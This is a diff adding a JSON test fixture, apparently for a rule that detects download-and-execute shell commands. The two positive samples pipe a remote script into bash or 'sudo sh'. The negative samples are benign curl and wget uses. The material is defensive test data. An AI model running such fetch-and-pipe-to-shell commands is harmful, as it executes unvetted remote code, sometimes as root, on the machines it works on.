@@ -1,0 +1,26 @@
+{
+  "positive": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'curl -s http://example.invalid/x.sh | bash'"
+    },
+    {
+      "Image": "/bin/sh",
+      "CommandLine": "sh -c 'wget -qO- http://example.invalid/i | sudo sh'"
+    }
+  ],
+  "negative": [
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'curl -s http://example.invalid/api | jq .'"
+    },
+    {
+      "Image": "/usr/bin/wget",
+      "CommandLine": "wget -O install.sh http://example.invalid/install.sh"
+    },
+    {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -c 'curl -s http://example.invalid/f | sha256sum'"
+    }
+  ]
+}
